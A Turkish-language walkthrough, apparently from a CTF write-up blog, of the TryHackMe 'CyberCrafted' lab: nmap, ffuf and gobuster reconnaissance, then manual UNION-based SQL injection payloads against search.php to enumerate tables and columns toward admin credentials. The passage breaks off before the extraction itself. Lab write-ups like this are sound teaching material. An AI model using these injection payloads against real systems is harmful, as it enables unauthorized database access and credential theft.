## Giriş

Hoşgeldiniz! Bu yazımda Tryhackme’de bulunan <a href="https://tryhackme.com/room/cybercrafted">CyberCrafted</a> makinesinin çözümünü paylaşacağım.

Geliştirme aşamasındaki bir Minecraft sunucusunun IP adresini buldun. Rootlayabilir misin?

Başlayalım.

## Görev 1 

1.
Kaç tane port açık?

nmap taraması başlatalım.

```
┌──(root㉿r3tr0)-[~]
└─# nmap -T5 -v -sV -p- 10.10.207.243
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 23:33 EST
```
nmap çıktısı:
```
┌──(root㉿r3tr0)-[~]
└─# nmap -T5 -v -sV -p- 10.10.207.243
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 23:33 EST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 23:33
Scanning 10.10.207.243 [4 ports]
Completed Ping Scan at 23:33, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:33
Completed Parallel DNS resolution of 1 host. at 23:33, 0.00s elapsed
Initiating SYN Stealth Scan at 23:33
Scanning 10.10.207.243 (10.10.207.243) [65535 ports]
Discovered open port 80/tcp on 10.10.207.243
Discovered open port 22/tcp on 10.10.207.243
SYN Stealth Scan Timing: About 42.52% done; ETC: 23:34 (0:00:42 remaining)
Discovered open port 25565/tcp on 10.10.207.243
Completed SYN Stealth Scan at 23:34, 67.57s elapsed (65535 total ports)
Initiating Service scan at 23:34
Scanning 3 services on 10.10.207.243 (10.10.207.243)
Completed Service scan at 23:34, 6.20s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.207.243.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.43s elapsed
Initiating NSE at 23:34
Completed NSE at 23:34, 0.38s elapsed
Nmap scan report for 10.10.207.243 (10.10.207.243)
Host is up (0.094s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.94 seconds
           Raw packets sent: 66803 (2.939MB) | Rcvd: 66600 (2.664MB)
```

Göründüğü gibi 3 tane açık port var 
> Cevap:3

2.
En yüksek portta hangi servis çalışıyor?

>Cevap: minecraft

3.
Herhangi bir alt alan adı (subdomain) var mı? (Alfabetik sırayla)

ffuz çalıştıralım.

```
┌──(root㉿r3tr0)-[~]
└─# ffuf -u http://cybercrafted.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.cybercrafted.thm" -fs 0
```

Komuttaki her argümanın ne anlama geldiğini merak ediyorsanız:

     -u: etki alanını tanımlıyoruz.
     -w: subdamin'li kelime listesi, bu durumda SecLists'in "subdomains-top1million-5000.txt" dosyasını kullanıyorum.
     -H: bu argüman HTTP başlığını tanımlar, biz web sunucusuna hangi sanal konağın kullanılacağını söyleyen “Host”u kullanırız, yani mevcut olması durumunda o alt alan adının içeriğini döndürecektir.
     -fs: ffuf'un bize her girişimi değil, yalnızca mevcut alt alan adlarını göstermesini istediğimiz için, boyutu "0" olan yanıtları kaldırmasını, başka bir deyişle, yalnızca geçerli bir alt alan adı döndüren girişimleri göstermesini söyleyebiliriz.

ffuf çıktısı:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybercrafted.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 92ms]
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 106ms]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 92ms]
www.admin               [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 91ms]
www.store               [Status: 403, Size: 291, Words: 20, Lines: 10, Duration: 91ms]
:: Progress: [4989/4989] :: Job [1/1] :: 433 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

Şimdi herhangi bir alt alan adına web tarayıcısından erişmeye çalıştığımızda sayfalar yüklenmiyor, aşağıdaki görüntüye benzer bir çıktı alıyoruz ama neden?

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a1.png?raw=true)

/etc/hosts dosyasına ip adresi ve domain, subdomain adreslerini ekleyelim. Bu şekilde sorunumuz çözülür.

```
┌──(root㉿r3tr0)-[~]
└─# nano /etc/hosts
```
![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a2.png?raw=true)

Artık subdomainlere erişebiliriz. store subdomainine erişimimiz yok admine girebiliyoruz.

Sayfalara göz gezdiğimde herhangi bir güvenlik açığı görmedim.

Gobuster çalıştırarak gizli dizinleri araştıralım.

```
gobuster dir -u http://store.cybercrafted.thm/ -w  /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php,html
```


```
Burada her parametrenin anlamı:

     dir: gobuster'a dizinleri veya dosyaları numaralandıracağımızı söyler.
     -u: numaralandırılacak etki alanını/alt etki alanını/ip'yi tanımlar.
     -w: kullanılacak kelime listesini ayarlayın, bu durumda dirbuster'dan “directory-list-lowercase-2.3-medium.txt”, bu Kali Linux'ta varsayılan olarak kurulur.
     -x: Tanımlı uzantıya sahip dosyayı bulmak için bu parametreyi kullanabiliriz, her biri kelime listesindeki her kelimeye eklenir.
```

gobuster çıktısı:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 287]
/index.html           (Status: 403) [Size: 287]
/.html                (Status: 403) [Size: 287]
/search.php           (Status: 200) [Size: 838]
/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
Progress: 2947 / 830576 (0.35%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2967 / 830576 (0.36%)
===============================================================
Finished
===============================================================                                                                                                      
```

search.php sayfasına bakalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a3.png?raw=true)

Siteye eriştiğimizde minecraft item arama sayfası olduğunu görüyoruz.

SQL enjeksiyonu işe yarayabilir.

Bundan sonraki kısımları sqlmap ile yapabilirsiniz fakat ben manuel olarak göstereceğim.


![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a4.png?raw=true)

Gördüğümüz gibi, arama terimi listelenen kelimelerin hiçbirini içermeden liste tüm öğeleri gösteriyor ve ayrıca herhangi bir uyarı veya uyarı da göstermiyor.

Artık SQL enjeksiyonuna karşı savunmasız olduğunu biliyoruz, yönetici adını görmek için kullanabiliriz.

Bu sayfayı SQL”UNION” sorgularıyla kötüye kullanabiliriz. Bilmemiz gereken ilk şey, orijinal SQL sorgusunun aldığı alanların sayısıdır; aşağıdaki kod parçası bize bu konuda yardımcı olabilir:

```
' UNION SELECT 1, ..., n #
```
![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a5.png?raw=true)

```
asdf' UNION SELECT 1, 2, 3, table_name FROM information_schema.tables WHERE table_schema = 'webapp' #
```

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a6.png?raw=true)

Listelenen tablolardan bize ilgili bilgileri verebilecek olanı, bu durumda yöneticinin adını içerebilecek olanı seçmeliyiz. Daha sonra bu tablonun sütunlarına bakmak isteriz. Sorgu sonuncuya çok benzer, veritabanı şemasından sağlanan tabloya ait olan sütunları seçin.

```
asdf' UNION SELECT 1, 2, 3, column_name FROM information_schema.columns WHERE table_name = 'admin' #
```
![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a7.png?raw=true)

Veritabanının yapısı hakkında daha fazla bilgiye sahibiz.

Son SQL sorgularının amacı veritabanının yapısı hakkında ayrıntılı bilgi almaktı, bu şekilde herhangi bir tablodan bazı verileri sorgulayabiliriz.

Bunu akılda tutarak, size daha fazla bilgi verebilecek olanları seçin; yöneticinin adını, şifresini ve mümkünse herhangi bir işareti almak istediğimizi unutmayın:

